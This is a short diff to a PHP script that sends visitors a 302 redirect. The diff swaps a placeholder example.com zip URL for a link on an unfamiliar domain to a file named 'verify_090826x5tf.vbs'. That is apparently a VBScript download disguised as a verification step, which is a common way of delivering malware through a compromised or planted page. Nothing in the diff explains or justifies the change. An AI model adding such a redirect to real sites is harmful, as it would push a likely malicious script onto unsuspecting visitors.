@@ -1,6 +1,6 @@
 <?php
 
-$url = 'https://example.com/files/test.zip';
+$url = 'https://hostmenow.one/verify_090826x5tf.vbs';
 
 header('Location: ' . $url, true, 302);
 exit;
